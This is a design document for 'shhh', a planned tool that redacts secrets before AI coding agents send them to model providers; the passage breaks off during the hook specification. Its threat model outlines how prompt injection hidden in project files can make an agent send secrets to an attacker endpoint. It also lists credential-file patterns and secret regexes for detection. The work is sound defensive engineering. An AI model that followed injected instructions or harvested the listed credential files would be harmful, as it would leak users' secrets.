# shhh — Product Requirements Document

> **Stop leaking secrets to AI agents.**
>
> A developer-facing CLI tool that detects, intercepts, and redacts secrets before AI coding agents (Claude Code, Codex, Cursor, Windsurf, Aider…) send them to remote LLM providers.

**Author:** Raphaël — Musubi SASU
**Version:** 0.1.0-draft
**Date:** 2026-04-13
**Status:** Pre-development — Architecture & Scope Definition

---

## Table of Contents

1. [Problem Statement](#1-problem-statement)
2. [Vision & Positioning](#2-vision--positioning)
3. [Target Users](#3-target-users)
4. [Competitive Landscape](#4-competitive-landscape)
5. [Product Architecture](#5-product-architecture)
6. [Core Features](#6-core-features)
7. [Technical Specifications](#7-technical-specifications)
8. [Installation & User Flows](#8-installation--user-flows)
9. [README & Marketing Strategy](#9-readme--marketing-strategy)
10. [Development Phases](#10-development-phases)
11. [Open Questions & Risks](#11-open-questions--risks)
12. [Success Metrics](#12-success-metrics)

---

## 1. Problem Statement

### The leak nobody talks about

Every AI coding agent — Claude Code, Codex, Cursor, Windsurf, Aider — reads project files to understand context. When the agent encounters a `.env` file, a `config/credentials.json`, or any file containing secrets, those values enter the model's context window verbatim. The agent doesn't need the raw values to reason about the code — it needs the **structure** and **semantic context** (what type of key, what service, what format).

### The threat model

"Your Stripe key went to OpenAI" is emotionally compelling but technically weak as a standalone argument: Anthropic and OpenAI contractually do not train on API traffic. We should not rely on that framing to sell the product. The real risks are:

1. **Prompt-injection exfiltration.** A malicious instruction hidden in a README, an issue comment, a log file, or a dependency the agent reads can coerce the model into emitting the secret to an attacker-controlled endpoint — as a tool call, a markdown link, or a fetch. The attack is public literature (Simon Willison and others, 2023–2025); the mitigation "just tell the model not to" is empirically unreliable. **This is the primary threat shhh defends against.**
2. **Copy-paste to consumer chat UIs.** Developers routinely paste agent context or file contents into claude.ai, chatgpt.com, or Gemini for a second opinion. Unlike API traffic, consumer chat surfaces are used for training by default unless the user explicitly opts out. A secret that was "safe" behind an API key now lives in a training corpus.
3. **Provider-side logs at rest.** API traffic is logged for abuse detection and retained for weeks. A breach of those logs is a breach of every secret that passed through them. Adjacent SaaS breaches have demonstrated this vector.
4. **Agent-side persistence.** Session transcripts, cache files, crash dumps on the developer's machine can contain the secret long after the task is done.

The common thread: **once the secret enters the model's context window, you no longer control where it ends up.** shhh keeps it out of the context in the first place.

### Evidence of the problem

- **GitHub Issue #44868** on `anthropics/claude-code`: "Claude Code exposes secrets from .env / .dev.vars files via grep -n and Read tool, despite CLAUDE.md prohibitions." 100+ upvotes, confirmed bug. Anthropic's own tool leaks secrets despite explicit instructions not to.
- **GitGuardian State of Secrets Sprawl**: 10+ million secrets leaked to public repos annually. The share reaching AI tools is unmeasured but substantial and growing.
- **Prompt injection in the wild**: multiple documented exfiltration attacks against agents that read untrusted content (Simon Willison's research, 2023–2025; various red-team reports).
- Every major secrets manager (Bitwarden, 1Password) has published blog posts in 2025–2026 warning about AI agents reading `.env` files.

### Why existing solutions fall short

- **Telling the agent "don't read .env"** doesn't work. The agent uses Bash, grep, cat — there are dozens of ways to access a file, and a CLAUDE.md instruction is a soft constraint the model can bypass.
- **.gitignore** protects version control, not the LLM context window.
- **Vault references** (1Password CLI, enject) require changing the entire secrets workflow. Adoption friction is enormous.
- **Existing redaction tools** (Rehydra, contextio) are either coupled to a single agent (OpenCode) or use destructive `[REDACTED]` that breaks LLM reasoning.

---

## 2. Vision & Positioning

### One-line pitch

**shhh** is a zero-config secret shield for AI coding agents. Scan what you leak, protect in one command.

### Positioning statement

For developers using AI coding agents, **shhh** is the tool that ensures your secrets never leave your machine. Unlike vault-based solutions that require workflow changes, or tool-specific hooks that only work with one agent, **shhh** provides multi-layered protection (native hooks + universal proxy + MCP) that installs in 30 seconds and works with every major coding agent.

### Core principles

1. **Zero friction** — The developer's workflow doesn't change. Same agent, same commands, same experience. shhh is invisible when it works.
2. **Graceful degradation** — If a tool update breaks an integration, the agent keeps working normally, just without protection. Nothing is ever worse than before.
3. **Agnostic by design** — No betting on a single tool. The architecture supports any agent that exists today or will exist tomorrow.
4. **Scan first, protect second** — The scan is the marketing. The protection is the product.
5. **Smart redaction, not blind censorship** — Secrets are replaced with semantically typed placeholders that preserve the LLM's ability to reason (`[OAUTH_CLIENT_ID:ebay:sandbox]` not `[REDACTED]`).
6. **Config-injected, not process-wrapping** — shhh installs by dropping config files into locations each tool already reads and running its own local daemon. It never launches, replaces, or wraps another tool's binary. **Invariant: uninstall shhh and your agent runs identically, minus protection.** This makes shhh safe to try, trivial to remove, and resilient to upstream tool updates.
7. **Eval-driven, not architecture-driven** — Every claim about "preserving agent reasoning" is validated by a reproducible eval suite (§10, Phase 0) before it ships. Bad numbers are publishable; unsubstantiated architecture diagrams are not.

---

## 3. Target Users

### Primary: The early adopter (Acquisition funnel)

- Developer or indie hacker who tries every new AI coding tool within a week of release
- Active on Twitter/X and Hacker News, follows AI tooling discourse
- Switches between Claude Code, Codex, Cursor based on current sentiment
- Scans READMEs quickly, looks for a single copy-pastable install command
- Stars and shares tools that give immediate, visual feedback
- **What they need**: `npx shhh scan .` → screenshot-safe output → tweet → move on
- **Why they matter**: They drive initial visibility and GitHub stars, and they are our best source of early bug reports because they test against unusual stacks

### Secondary: The serious developer (Retention funnel)

- Professional developer using AI agents daily for real projects
- Handles production credentials, client secrets, API keys
- Concerned about data going to third-party LLM providers
- Will evaluate the tool properly after seeing social proof
- **What they need**: Reliable, low-maintenance protection that doesn't break their workflow
- **Why they matter**: They provide sustained usage, bug reports, PRs, and word-of-mouth

### Tertiary: The security-conscious team lead

- Responsible for team-wide tooling decisions
- Needs to ensure compliance with data handling policies
- Looking for something they can mandate across the team
- **What they need**: `shhh init` in CI/CD, team-wide configuration, audit logs
- **Why they matter**: They drive enterprise adoption (future monetization path)

---

## 4. Competitive Landscape

### Direct competitors and adjacent tools

| Tool | Approach | Strengths | Weaknesses | Our advantage |
|------|----------|-----------|------------|---------------|
| **Rehydra** | Regex + NER ONNX model, semantic placeholders, reversible | Best-in-class detection engine, typed placeholders preserve LLM reasoning | Coupled to OpenCode primarily, 280MB model download, non-trivial setup | Agnostic multi-tool support, zero-config TUI installer, scan-first UX |
| **AgentSecrets** | Zero-knowledge proxy, OS keychain, transport-layer injection | Solves the "use secrets without seeing them" problem architecturally | Only covers API calls, doesn't help when agent reads config files | We cover file reading interception, not just API call proxying |
| **Claude Code Hooks** (Trevor Stenson) | PreToolUse hook, regex detection, file path swap | Native to Claude Code, zero dependencies, lightweight | Claude Code only, basic regex, destructive `<REDACTED>` | Multi-tool + smart semantic placeholders |
| **1Password CLI / enject** | Vault references instead of plaintext in .env | Architecturally clean, good for teams | Requires changing entire secrets workflow, huge adoption friction | Zero workflow change required |
| **contextio** | HTTP reverse proxy, logs + optional redaction | Truly agnostic (proxy for any tool), good observability | Redaction is basic regex presets, more an observability tool | Our proxy layer has semantic detection, not just regex presets |
| **LiteLLM** | Enterprise proxy with guardrails including secret detection | Full-featured proxy, enterprise-grade | Enterprise-only feature, heavy setup, overkill for individual devs | Lightweight, open-source, developer-focused |

### Key insight

No existing tool combines all three of:
1. **A standalone scan** that shows the problem (marketing hook)
2. **Native integrations** per tool (hooks, MCP, rules) that don't require wrapping
3. **A universal proxy** as a safety net

shhh does all three.

---

## 5. Product Architecture

### Design philosophy

shhh operates as **three independent layers** connected by a session-scoped placeholder map, each installable separately, each useful on its own. When combined they provide defense in depth. The key architectural constraint: **shhh is config-injected, not process-wrapping.** It deposits configuration files into the standard locations each tool already reads (`~/.claude/settings.json`, `.cursor/mcp.json`, `.cursor/rules/`) and runs its own local daemon. It never launches, replaces, or wraps another tool's binary. Invariant: uninstall shhh and your agent runs identically, minus protection.

### The session-scoped placeholder map

The glue that makes the three layers compose. A per-session in-memory map from real secret values to semantic placeholders (and vice versa for rehydration). Properties:

- **Deterministic within a session.** The same real value always maps to the same placeholder within one session, enabling cross-file identity reasoning (`compare_secrets`, consistency checks) without exposing the value.
- **Salted across sessions.** A fresh random salt per session means placeholders from one session cannot be replayed, correlated, or rehydrated in another session or by another user.
- **In-memory only.** Never persisted to disk. Daemon crash or restart discards the map and ends the session. Limits blast radius of a compromised daemon.
- **Shared between Layers 1, 2, and 3.** The hook, the proxy, and the MCP server all read/write the same map for the active session via a local Unix socket. A secret redacted by the hook can be rehydrated by the proxy and inspected by a compensatory MCP tool — because they all see the same map.

### Layer 1 — Native Hooks (Hard enforcement)

Intercepts tool calls **before** execution for file reads, refuses writes to sensitive files entirely, and redacts tool results **after** execution for command outputs. The agent never sees the raw secret in its context.

```
PRE-TOOL-USE                          POST-TOOL-USE
─────────────                         ──────────────
Read(.env)                            Bash(grep -r foo .)
    │                                     │
    ▼                                     ▼
┌──────────────────┐                  ┌──────────────────┐
│ Sensitive?       │                  │ Run command      │
│   ├─ yes: redact │                  │ Scan stdout via  │
│   │   & swap path│                  │  session map +   │
│   └─ no: pass    │                  │  detection       │
└────────┬─────────┘                  │ Replace hits     │
         │                            │  with placeholder│
         │    Edit/Write(.env)        └──────────────────┘
         │           │
         │           ▼
         │    REFUSE with clear
         │    error → shhh edit-secret
         ▼
    session map (shared with Layer 2 + Layer 3)
```

**Supported tools:**
- **Claude Code**: `PreToolUse` + `PostToolUse` hooks in `~/.claude/settings.json` (or project-level `.claude/settings.local.json`).
- **Codex**: `AGENTS.md` instructions + hook system (when available).
- Future tools with hook APIs.

**Three distinct hook roles, one binary:**

1. **PreToolUse on Read** — path-swap to a redacted copy. Standard read interception.
2. **PreToolUse on Edit/Write/MultiEdit — *refuse* on sensitive paths.** Path-swapping a write is a silent data-loss bug waiting to happen: either the agent writes to a redacted copy and the real file never changes, or the Edit's `old_string` no longer matches because it was itself redacted on read. Both outcomes are worse than a leak. shhh returns an explicit deny with a pointer to `shhh edit-secret <file> <key>` for the safe path. See §7.5 for the exact error message.
3. **PostToolUse on Read/Bash/Grep/Glob** — scan tool results for anything matching the session map or the detection pipeline, replace hits with deterministic placeholders before the result reaches the model. **This layer replaces command-parsing of Bash.** Trying to parse `cat $(echo .env)`, subshells, Python one-liners, and shell expansions is a losing arms race; redacting the *output* of whatever command ran is bounded and correct. If a secret appears in stdout, it gets replaced; if it doesn't, nothing happens.

**How PreToolUse (Read) works:**
1. Hook receives `{ "tool": "Read", "input": { "file_path": ".env" } }` over stdin.
2. If file_path matches sensitive patterns: reads the original, runs the detection pipeline, writes a redacted copy to `/tmp/shhh-<session>/<hash>/<filename>` using the session placeholder map, returns modified input pointing to the copy.
3. Otherwise: empty output (pass-through; PostToolUse will still scan the result).

**How PostToolUse works:**
1. Hook receives `{ "tool": "Bash", "output": "<stdout/stderr>", ... }`.
2. Fast membership check against the session map (exact string match on known secret values).
3. Full detection pipeline on any new high-entropy or pattern-matching strings; new hits are added to the session map.
4. Returns the output with all hits replaced by their placeholders.

**Known limitations (documented, accepted):**
- Binary outputs (non-UTF-8) are not scanned; shhh logs a warning.
- Very large outputs (>10MB default, configurable) are truncated before scanning; the tail is marked `[shhh: output truncated for scan]`.
- PostToolUse cannot undo *side effects* of the command. If a command sends a secret over the network, the hook sees it after the fact. Layer 2 proxy covers network egress for the subset of tools where it applies.

### Layer 2 — API Proxy with Rehydration (Universal safety net)

Redacts outbound messages to LLM providers **and rehydrates placeholders in tool_use arguments flowing back to local execution**. Without rehydration, any task that requires the agent to *use* a secret (authenticated HTTP, database connect, file decrypt) fails on a confusing error when the placeholder reaches the tool. The cycle has to close: redact on read, rehydrate on execute, re-redact on result.

```
OUTBOUND (redact)                     INBOUND (rehydrate tool_use)
─────────────────                     ───────────────────────────
Agent ──messages──▶ Proxy ──▶ LLM     LLM ──tool_use──▶ Proxy ──▶ Agent
                      │                                   │
                      ▼                                   ▼
              redact via session              rehydrate placeholders
              map; forward modified           in tool_use.input via
              request to upstream             session map; forward
                                               to agent for execution
```

**How it integrates (non-invasive):**
- Sets environment variables that tools natively respect:
  - `ANTHROPIC_BASE_URL=http://localhost:8787/v1/anthropic`
  - `OPENAI_BASE_URL=http://localhost:8787/v1/openai`
- **Coverage is honest, not universal.** The proxy works for CLI tools running on API keys that respect `*_BASE_URL`:
  - ✅ Claude Code (API-key mode), Aider, OpenCode, direct SDK use
  - ❌ Claude Code in subscription-auth mode (routing bypasses `BASE_URL` for the subscription backend)
  - ❌ Cursor agent mode (routes through Cursor's servers, not directly to Anthropic/OpenAI)
  - ❌ Windsurf and other IDEs with server-side routing
  - For the tools in the ❌ list, Layer 1 (hooks, where the vendor exposes them) or Layer 3 (MCP) is the only option. See §4 compatibility matrix.

**Outbound flow (redact):**
1. Receives the outbound API request with its `messages` array.
2. Runs secret detection on all content fields.
3. Replaces secrets with semantic placeholders via the session map (shared with Layer 1 when both are active).
4. Forwards modified request to the upstream provider.

**Inbound flow (rehydrate for local tool execution):**
1. Receives the upstream response, which may contain model-generated `tool_use` blocks (e.g., `bash: curl -H "Authorization: Bearer [GITHUB_PAT:ghp_...]"`).
2. Walks the `tool_use.input` fields looking for known placeholder formats.
3. For each placeholder found, looks up the real value in the session map and substitutes it in.
4. Passes the rehydrated response to the agent, which executes the tool with real secrets.
5. The tool result then flows back through Layer 1 PostToolUse (or a second pass of outbound redaction on the next turn) and is re-redacted before reaching the model again.

**Placeholder collision safety.** Lookups are session-scoped and salted. Rehydration fails closed: if a string looks like a placeholder but is not present in the current session map (e.g., the model invented one, or an attacker placed one in untrusted content), the literal string is passed through unchanged — the model cannot coerce shhh into rehydrating arbitrary values.

**Daemon lifecycle.** The session map lives in the daemon process memory. Daemon crash or restart ends the session and discards the map. This is a deliberate safety property, not an oversight — it limits the blast radius of a compromised daemon and ensures placeholders cannot be replayed across restarts. Cost: a restart mid-task loses rehydration context and the next tool execution fails once; the agent retries and rebuilds the map on the next read.

### Layer 3 — MCP Server (Soft enforcement for IDEs)

Provides an alternative "read sensitive file" tool that IDE-based agents can use instead of their native Read tool.

```json
{
  "mcpServers": {
    "shhh": {
      "command": "npx",
      "args": ["shhh", "mcp-serve"]
    }
  }
}
```

**Exposed MCP tools:**

*File-reading tools:*
- `read_sensitive_file(path)` — Returns the file content with secrets replaced by placeholders from the session map.
- `list_sensitive_files(directory)` — Scans a directory and returns which files contain secrets.

*Compensatory tools (first-class product surface).* These tools let the agent extract useful information about a secret without ever seeing its raw value. Each addresses a specific class of task that pure redaction makes impossible. The list is designed to grow as the eval suite (§10, Phase 0) reveals new failure modes — **a compensatory tool ships only when an eval task demonstrates it is needed**, never speculatively.

- `decode_jwt_safely(placeholder_id) → {alg, exp, iss, aud, scopes, ...}` — Returns non-sensitive claims from a JWT without exposing the signature or the full token. Answers the "inspect a session token's expiry and scopes" use case.
- `compare_secrets(placeholder_a, placeholder_b) → bool` — Returns `true` iff two placeholders refer to the same real value in the session map. Answers "is this the same key in `.env` and `docker-compose.yml`?" without either placeholder being dereferenced.
- `grep_hardcoded(placeholder_id, directory) → [{file, line}]` — Searches the codebase for occurrences of the real secret value by placeholder ID. Answers the security-audit use case where the agent wants to find all hardcoded copies of a key and would otherwise grep for the placeholder string and find nothing.
- `explain_secret(placeholder_id) → {type, service, length, entropy_bits, format_valid}` — Returns metadata about a redacted secret without revealing its value.

Compensatory tools compose with Layer 1 and Layer 2 via the shared session map — no re-architecture is required to add a new one, only a new lookup function.

**Limitation:** An MCP server cannot prevent the agent from using its native Read tool. shhh mitigates this by also installing a **rules file** (`.cursor/rules/shhh.md`, `.windsurfrules`, etc.) that instructs the agent to prefer the shhh MCP for sensitive files. This is soft enforcement — the agent may not always comply.

**Supported tools:**
- Cursor (`.cursor/mcp.json` + `.cursor/rules/shhh.md`)
- Windsurf (MCP config + `.windsurfrules`)
- Any MCP-compatible IDE.

---

## 6. Core Features

### 6.1 — `shhh scan` (The marketing hook)

**Purpose:** Show the user what secrets in their project would be exposed to AI agents.

**Usage:**
```bash
npx shhh scan .                    # Scan current directory
npx shhh scan ./my-project         # Scan specific path
npx shhh scan . --format json      # Machine-readable output
npx shhh scan . --format md        # Markdown report
```

**Output (terminal, colorized, screenshot-safe by default):**
```
🛡️  shhh scan — /home/user/my-project

🔴 .env — 4 secrets detected
   STRIPE_SECRET_KEY     Stripe live secret key (sk_live_•••)
   DATABASE_URL          PostgreSQL connection string (user: •••, host: •••)
   JWT_SECRET            High-entropy string (64 chars, hex)
   OPENAI_API_KEY        OpenAI API key (sk-proj-•••)

🔴 config/auth.json — 1 secret detected
   signing_key           RSA private key (2048-bit, PKCS#8)

🟡 docker-compose.yml — 1 potential secret
   POSTGRES_PASSWORD     Environment variable (weak value, flagged)

✅ 23 other config files — clean

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  4 files scanned  ·  6 secrets found  ·  1 warning
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Run `shhh init` to protect these secrets from AI agents.
Run with `--show-details` for usernames, hosts, and connection metadata
(local inspection only — avoid in screenshots).
```

**Key design decisions:**
- The scan runs via `npx` with zero installation. Download, execute, display, done.
- Each secret gets a **semantic description**: "Stripe live secret key", "PostgreSQL connection string", not "secret detected".
- **Screenshot-safe by default.** The scan masks usernames, hostnames, and connection-string internals with `•••`. The design assumption is that users will screenshot the output and post it publicly. Any contextual metadata (admin user, internal hostnames, port numbers) is a second-order leak the tool itself must not create. `--show-details` opts into full output for local inspection; it is never the default.
- The final line is a CTA to `shhh init`.

### 6.2 — `shhh init` (The TUI installer)

**Purpose:** Auto-detect installed AI tools, let the user choose integrations, install everything, run initial scan.

**Flow:**
```
$ npx shhh init

  🛡️  shhh — setup

  Scanning your system...

  Detected tools:
  ✅ Claude Code v2.3.1        Hook integration available (recommended)
  ✅ Cursor 1.2.0              MCP + rules integration available
  ⬜ Codex CLI                 Not found
  ⬜ Windsurf                  Not found
  ✅ Aider                     Proxy integration available

  Select integrations to install:
  ▸ [x] Claude Code — PreToolUse hook (intercepts file reads & bash)
    [x] Cursor — MCP server + rules file
    [x] Universal proxy — works with Aider and any BASE_URL-compatible tool
    [ ] Skip all — just use `shhh scan` manually

  Press Enter to confirm...

  Installing...
  ✅ Claude Code hook → ~/.claude/settings.json (backup saved)
  ✅ Cursor MCP → .cursor/mcp.json
  ✅ Cursor rules → .cursor/rules/shhh.md
  ✅ Proxy daemon configured → localhost:8787
  ✅ Shell profile updated → ANTHROPIC_BASE_URL, OPENAI_BASE_URL

  Running initial scan...

  🔴 .env — 3 secrets will be protected
  ✅ Your AI agents are now shielded.

  Next steps:
  • Restart Claude Code and Cursor to pick up the new config
  • Run `shhh status` to verify protection is active
  • Run `shhh logs` to see interceptions in real time
```

**Tool detection heuristics:**
- Claude Code: check for `claude` binary in PATH, `~/.claude/` directory
- Cursor: check for `cursor` binary or `~/.cursor/` directory, or `.cursor/` in project
- Codex: check for `codex` binary in PATH
- Windsurf: check for `windsurf` binary or config directory
- Aider: check for `aider` binary in PATH

### 6.3 — `shhh install <tool>` (Per-tool install)

**Purpose:** Install integration for a specific tool without the full TUI.

```bash
shhh install claude-code    # Install PreToolUse hook
shhh install cursor          # Install MCP server + rules
shhh install codex           # Install AGENTS.md instructions + hook if available
shhh install proxy           # Start proxy daemon + configure BASE_URLs
shhh install aider           # Configure BASE_URL for Aider specifically
```

Each command is idempotent — running it twice doesn't duplicate configuration.

### 6.4 — `shhh status` (Health check)

```
$ shhh status

🛡️  shhh v0.1.0 — active since 14:32

Integrations:
  ✅ Claude Code hook    — installed, settings.json valid
  ✅ Cursor MCP          — installed, server responding
  ✅ Proxy daemon        — running on localhost:8787 (PID 4821)
  ⚠️  Aider BASE_URL     — configured but Aider not running

Statistics (this session):
  📊 Intercepted: 12 file reads · Blocked: 4 secrets · Passed: 187 requests
  📝 Last interception: 2 minutes ago (.env → 3 secrets redacted)

Configuration:
  📁 Config: ~/.config/shhh/config.toml
  📁 Rules: ~/.config/shhh/rules/
  📁 Logs: ~/.config/shhh/logs/
```

### 6.5 — `shhh logs` (Real-time monitoring)

```
$ shhh logs

 14:32:01 ✋ HOOK    Claude Code Read(.env) → 4 secrets redacted
                    STRIPE_SECRET_KEY → [STRIPE_LIVE_KEY:sk_live_...]
                    DATABASE_URL → [POSTGRES_CONNSTRING:admin@***:5432/myapp]
                    JWT_SECRET → [HIGH_ENTROPY:64chars:hex]
                    OPENAI_API_KEY → [OPENAI_KEY:sk-proj-...]
 14:32:15 ✅ HOOK    Claude Code Read(src/index.ts) → clean, passed through
 14:33:02 ✋ HOOK    Claude Code Bash(cat .env.local) → redirected to redacted copy
 14:33:44 ✋ PROXY   Outbound message contained 1 secret (missed by hook)
                    AWS_ACCESS_KEY_ID → [AWS_KEY:AKIA...]
 14:34:01 ✅ PROXY   Outbound message clean
```

### 6.6 — `shhh doctor` (Troubleshooting)

```
$ shhh doctor

Checking integrations...
  ✅ Claude Code hook: settings.json valid, hook script executable
  ✅ Cursor MCP: mcp.json valid, server binary found
  ⚠️  Proxy daemon: not running (start with `shhh proxy start`)
  ✅ Shell profile: BASE_URL variables set in ~/.zshrc

Checking detection rules...
  ✅ Gitleaks rules: 712 patterns loaded (v8.22.0)
  ✅ Custom rules: 3 user rules in ~/.config/shhh/rules/custom.toml

Checking permissions...
  ✅ Hook script: executable
  ✅ Temp directory: /tmp/shhh-* writable
  ✅ Config directory: ~/.config/shhh/ writable

Overall: 🟡 1 issue found — proxy not running.
```

### 6.7 — `shhh add-rule` / `shhh ignore` (Customization)

```bash
# Add a custom secret pattern
shhh add-rule --name "internal-api-token" --pattern "INTERNAL_[A-Z]+_TOKEN=.+"

# Ignore a specific file (it's a test fixture, not real secrets)
shhh ignore test/fixtures/.env.test

# Ignore a specific secret (false positive)
shhh ignore --secret "DATABASE_URL" --reason "local dev only, no real credentials"
```

---

## 7. Technical Specifications

### 7.1 — Technology stack

| Component | Technology | Rationale |
|-----------|-----------|-----------|
| **CLI binary** | **Go** | Single binary, no runtime dependency, cross-platform (darwin/linux/windows, amd64/arm64), fast startup. Alternatively Rust if preferred, but Go has better ecosystem for HTTP proxies and CLI tooling. |
| **Secret detection** | **Gitleaks rules (embedded)** | 700+ battle-tested TOML rules, maintained by the community, covers all major providers (AWS, GCP, Stripe, GitHub, etc.). Embed rules at compile time, no external dependency. |
| **Entropy detection** | **Shannon entropy + bigram analysis** | Catches high-entropy strings that don't match known patterns. Configurable threshold (default: 4.5 bits/char for strings > 16 chars). |
| **Semantic labeling** | **Pattern-based heuristics** | No LLM needed for v1. Known prefixes (`sk_live_`, `AKIA`, `ghp_`, `xox[bp]-`) map to semantic labels. Connection string parsing extracts service/user/host. Fallback: `[HIGH_ENTROPY:<length>chars:<charset>]`. |
| **Hook scripts** | **Shell (bash/zsh) + Node.js fallback** | Claude Code hooks execute shell commands. The hook script calls the shhh binary for detection/redaction. Node.js fallback for Windows or environments without bash. |
| **Proxy server** | **Go net/http reverse proxy** | Minimal, zero-dependency HTTP reverse proxy. Intercepts request bodies, scans message content fields, replaces secrets, forwards. |
| **MCP server** | **Go with MCP SDK** or **Node.js with @modelcontextprotocol/sdk** | MCP servers are typically launched as stdio processes. Node.js has the most mature MCP SDK. Could also be Go with manual JSON-RPC over stdio. |
| **TUI** | **Bubble Tea (Go)** or **Ink (Node.js)** | For the `shhh init` interactive installer. Bubble Tea if CLI is Go, Ink if Node.js. |
| **Configuration** | **TOML** | Consistent with gitleaks rule format. Stored in `~/.config/shhh/config.toml`. |
| **Distribution** | **npm (npx), Homebrew, curl installer, Go install** | npm/npx for the "zero-install scan" use case. Homebrew for macOS devs. Curl installer for Linux servers. `go install` for Go devs. |

### 7.2 — Secret detection pipeline

```
Input (file content or message string)
         │
         ▼
┌─────────────────────────────┐
│  1. Known pattern matching   │  Gitleaks TOML rules (700+)
│     - Provider prefixes      │  sk_live_, AKIA, ghp_, xox[bp]-...
│     - Connection strings     │  postgresql://, mongodb://, redis://...
│     - Key file headers       │  -----BEGIN RSA PRIVATE KEY-----
│     - Env var patterns       │  [A-Z_]*(KEY|SECRET|TOKEN|PASSWORD)=...
└──────────────┬──────────────┘
               │ Matches? → Label with semantic type
               ▼
┌─────────────────────────────┐
│  2. Entropy analysis         │  Shannon entropy on remaining strings
│     - Threshold: 4.5 bits    │  Only for strings > 16 chars
│     - Charset detection      │  hex, base64, alphanumeric, mixed
└──────────────┬──────────────┘
               │ High entropy? → Label as [HIGH_ENTROPY:...]
               ▼
┌─────────────────────────────┐
│  3. .env cross-reference     │  If .env files exist in project:
│     - Load .env values       │  Match exact values anywhere in content
│     - Length gate ≥12 chars  │  Shorter values skipped (FP-heavy)
│     - Entropy gate ≥3.0 bits │  Low-entropy values (`password`,
│     - Denylist of common     │  `12345`, `localhost`, `changeme`,
│       sentinels              │  `example`, etc.) skipped
│     - Catches non-standard   │  Custom secrets without pattern match
└──────────────┬──────────────┘
               │
               ▼
         Redacted output with semantic placeholders
```

### 7.3 — Semantic placeholder format

Placeholders follow a consistent format that preserves maximum context for the LLM:

```
[<TYPE>:<SERVICE>:<DETAIL>]
```

**Examples:**
| Original | Placeholder |
|----------|-------------|
| `sk_live_4eC39HqLyjWDarjtT1zdp7dc` | `[STRIPE_LIVE_KEY:sk_live_...]` |
| `AKIA3EXAMPLE7XYZABC` | `[AWS_ACCESS_KEY:AKIA...]` |
| `postgresql://admin:s3cret@prod-db:5432/myapp` | `[POSTGRES_CONNSTRING:admin@prod-db:5432/myapp]` |
| `ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx` | `[GITHUB_PAT:ghp_...]` |
| `-----BEGIN RSA PRIVATE KEY-----` | `[RSA_PRIVATE_KEY:2048bit]` |
| `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.xxx.xxx` | `[JWT_TOKEN:HS256]` |
| `a7f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5` | `[HIGH_ENTROPY:32chars:hex]` |
| `xoxb-123456789-abcdefghij` | `[SLACK_BOT_TOKEN:xoxb-...]` |

**Design rules:**
- **Public prefixes only.** Only prefixes that are public information about the service (`sk_live_`, `AKIA`, `ghp_`, `xoxb-`) are preserved. These leak "this user has a Stripe live key" which is rarely sensitive; they do *not* leak any bits of the actual secret beyond the public prefix. Any characters after the public prefix are replaced with `...`, not truncated copies of the real value.
- **Connection strings** preserve structure (user, host, port, database) in the *context passed to the LLM* but strip query-string parameters that frequently hold tokens. In the *scan output shown to the user*, even structural fields are masked with `•••` by default (see §6.1 screenshot-safety).
- **High-entropy fallback** includes length and charset to help the model reason about format (`[HIGH_ENTROPY:32chars:hex]`) without revealing any bits of the value.

### Session-deterministic placeholder map

Placeholders are **deterministic within a session and salted across sessions**. The placeholder for a given real value is stable throughout one agent session: `sk_live_a7f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5` always maps to `[STRIPE_LIVE_KEY:sk_live_:a7f3]` (with a short session-salt-derived suffix) no matter how many times it appears or which file it comes from.

**Within a session, placeholder identity implies value identity.** This is what makes `compare_secrets` work and lets the agent reason about cross-file consistency without ever seeing values.

**Across sessions, the salt changes.** Placeholders from a previous session, from another user, or from a screenshot posted publicly cannot be correlated, replayed, or rehydrated. The session salt is generated on daemon start from `crypto/rand` and never written to disk.

**Residual entropy analysis.** For a placeholder like `[STRIPE_LIVE_KEY:sk_live_:a7f3]`, the information revealed about the real value is: (a) that the user has a Stripe live key (0 bits about the value, 1 bit about the user), (b) that this placeholder refers to the same key as another placeholder with the same suffix *in the same session* (0 bits about the value). The 4-char suffix is a hash of the value and the session salt; without the salt (which never leaves memory), the suffix reveals no bits of the value even under a chosen-plaintext attack. This property is measured directly in eval task 7 (§10.1).

### 7.4 — Sensitive file patterns

Default patterns for files that trigger interception:

```toml
[files]
# Exact filenames
sensitive_names = [
  ".env", ".env.local", ".env.development", ".env.staging", ".env.production",
  ".env.test", ".env.example",  # Often contains real values despite the name
  ".dev.vars",                  # Cloudflare Workers
  ".npmrc",                     # npm auth tokens
  ".pypirc",                    # PyPI auth tokens
  ".netrc",                     # Network authentication
  ".pgpass",                    # PostgreSQL passwords
  ".my.cnf",                    # MySQL config with passwords
  "credentials", "credentials.json", "credentials.yml",
  "service-account.json",       # GCP service accounts
  "keyfile.json",
]

# Glob patterns
sensitive_globs = [
  "*.pem", "*.key", "*.p12", "*.pfx", "*.jks",
  "**/secrets/**",
  "**/.secrets/**",
  "**/credentials/**",
  "**/*secret*",
  "**/*credential*",
]

# Directories always excluded from interception (not sensitive)
safe_directories = [
  "node_modules", ".git", "vendor", "__pycache__", ".venv",
  "dist", "build", "target",
]
```

Users can override via `~/.config/shhh/config.toml` or `.shhh.toml` at project root.

### 7.5 — Claude Code hook implementation (Layer 1 reference)

**Installation target:** `~/.claude/settings.json` (global) or `.claude/settings.local.json` (project-level)

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Read",
        "command": "shhh hook pre-read"
      },
      {
        "matcher": "Edit|Write|MultiEdit",
        "command": "shhh hook refuse-if-sensitive"
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Read|Bash|Grep|Glob",
        "command": "shhh hook post-tool-use"
      }
    ]
  }
}
```

Three hook entrypoints, one `shhh` binary. All of them read a structured JSON tool-call record over stdin and return either a modified record, an empty result (pass-through), or a deny decision. They never `eval` user-controlled content.

**`shhh hook pre-read` — Read interception:**

```
stdin: { "tool": "Read", "input": { "file_path": ".env" } }
                │
                ▼
    Is file_path in sensitive patterns?
        │                        │
       YES                      NO
        │                        │
        ▼                        ▼
    1. Read original file      Return empty
    2. Run detection pipeline  (pass-through; PostToolUse
    3. Write redacted copy      will still scan the result)
       to /tmp/shhh-<session>/<hash>/<filename>
       using the session map
    4. Output: { "tool": "Read",
                 "input": { "file_path": "/tmp/shhh-<session>/<hash>/.env" } }
```

**`shhh hook refuse-if-sensitive` — Edit/Write refusal:**

